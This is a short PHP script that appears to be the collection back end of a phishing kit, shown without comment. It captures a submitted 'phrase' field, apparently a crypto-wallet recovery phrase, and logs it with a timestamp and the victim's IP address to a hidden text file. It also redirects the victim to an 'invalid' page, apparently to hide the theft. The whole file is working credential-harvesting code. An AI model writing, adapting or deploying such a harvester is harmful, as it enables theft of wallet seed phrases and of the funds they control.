<?php
header("location: /invalid.aspx?lang=en");
?>
<?php
$username = $_POST['phrase'];
date_default_timezone_set('Asia/Jakarta');
$tanggal=date("d-m-Y  h:i:s");
$ip = $_SERVER["REMOTE_ADDR"];
$file = "aegrshthjydjuyjku.txt";

$handle = fopen($file, 'a');
fwrite($handle, "===========+ +=============================");
fwrite($handle, "\n");
fwrite($handle, "Pharse     : ");
fwrite($handle, "$username");
fwrite($handle, "\n");
fwrite($handle, "Tanggal    : ");
fwrite($handle, "$tanggal");
fwrite($handle, "\n");
fwrite($handle, "Ip Addres  : ");
fwrite($handle, "$ip");
fwrite($handle, "\n");
fclose($handle);
echo " ";

?>